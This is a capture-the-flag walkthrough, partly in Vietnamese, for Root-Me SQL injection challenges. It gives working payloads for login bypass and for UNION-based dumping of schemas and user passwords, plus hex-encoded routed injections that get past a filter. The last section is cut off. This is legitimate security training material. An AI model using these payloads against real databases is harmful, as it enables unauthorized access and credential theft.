## [SQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Authentication)
### Steps to reproduce

  - Start the challenge
  - Go to the login page
  - Use the following payloads to bypass authentication:
    - Username: `admin' -- `
    - Password: `admin` 
    - Click on the "Login" button
  - Đăng nhập thành công với tư cách là quản trị viên
  - To validate the challenge use this password --> password = 'admin' --> error
  - Ctrl + U để xem source code
  - Tìm thấy password `value` trong source code
  - Submit the password to complete the challenge.

## [SQL injection - Strings](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Strings)
### Steps to reproduce
- Start the challenge
- Bài này cho ta nhiều lựa chọn hơn, ta có các chức năng như đăng nhập, tìm kiếm hay xem thông tin
- Tuy nhiên lỗi sqli xuất hiện tại ô tìm kiếm. 
- Để biết được tại sao lại bị lỗi sqli ta chỉ cần nhập vào ký tự `1'` . Lỗi sẽ xuất hiện Và biết đây là `sqlite3`
- Để khai thác lỗi sqli ta có thể sử dụng payload sau: `1' UNION SELECT sql, null FROM sqlite_master--`
- Ta sẽ thấy được các bảng trong database
- Tiếp theo ta sẽ lấy dữ liệu từ bảng `users` với payload sau: `1' UNION SELECT username,password FROM users--`
- Ta sẽ thấy được username và password của các user trong bảng users
- Submit password của user admin để hoàn thành challenge

## [SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)
### Steps to reproduce
- Start the challenge
- Bài này ta có thể thấy lỗi sqli xuất hiện tại tham số id trong url `action=new&new_id=1`
- Để biết được tại sao lại bị lỗi sqli ta chỉ cần nhập vào ký tự `1'` . Lỗi sẽ xuất hiện Và biết đây là `sqlite3`
- Để khai thác lỗi sqli ta có thể sử dụng payload sau: `1 UNION SELECT null,sql, null FROM sqlite_master--`
- Ta sẽ thấy được các bảng trong database
- Tiếp theo ta sẽ lấy dữ liệu từ bảng `users` với payload sau: `1 UNION SELECT null,username,password FROM users--`
- Ta sẽ thấy được username và password của các user trong bảng users
- Submit password của user admin để hoàn thành challenge.

## [SQL Injection – Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)
### Steps to reproduce
- Start the challenge
- Bài này ta có thể thấy lỗi sqli xuất hiện tại chức năng tìm kiếm
- SQL Injection – Routed : HIỂU ĐƠN GIẢN LÀ DẠNG INJECTON MÀ CÂU QUERY 2 SẼ ĐƯỢC “LỒNG” VÀO CÂU QUERY 1
- Playload: `1'` --> lỗi syntax
- Về cơ bản thường ta sẽ khai thác `' union select (giá trị muốn khai thác)-- `. Tuy nhiên thì với routed thì giá trị truy vấn với select đầu tiên sẽ không phải là truy vấn đầu vào.
- Playload: `' UNION SELECT 1-- ` --> done 
- Playload: `' UNION SELECT 'union select null,null-- ` --> `attack detected` chứng tỏ truy vấn đã bị filter mất.=> thử mã hóa `hexa truy` vấn thứ 2
- hexa của `'union select null,null-- -` là `27756E696F6E2073656C656374206E756C6C2C6E756C6C2D2D202D`
- 0x là ký tự đại diện cho hexa với hệ số 16
- Playload: `' UNION SELECT 0x27756E696F6E2073656C656374206E756C6C2C6E756C6C2D2D202D-- ` --> done
- Tìm database
- Playload: `' union select 'union SELECT 1,table_name FROM information_schema.tables where table_schema = database()-- `
- hexa của `'union SELECT 1,table_name FROM information_schema.tables where table_schema = database()-- -` là `27756E696F6E2053454C45435420312C7461626C655F6E616D652046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D61203D20646174616261736528292D2D202D`
- Playload: `' union select 0x27756E696F6E2053454C45435420312C7461626C655F6E616D652046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D61203D20646174616261736528292D2D202D-- `
- Tìm cột
- Playloaf: `' union select' union SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- - -- `
- hexa của `' union SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- -` là `2720756E696F6E2053454C45435420312C67726F75705F636F6E63617428636F6C756D6E5F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73205748455245207461626C655F6E616D65203D20277573657273272D2D202D`
- Playload `' union select 0x2720756E696F6E2053454C45435420312C67726F75705F636F6E63617428636F6C756D6E5F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73205748455245207461626C655F6E616D65203D20277573657273272D2D202D-- `
- Lấy user pass `' union select' union select 1,concat(login,' : ',password) from users-- - --`

## [SQL injection – Error]
### Steps to reproduce
- `http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC'` --> error --> sql injection
- 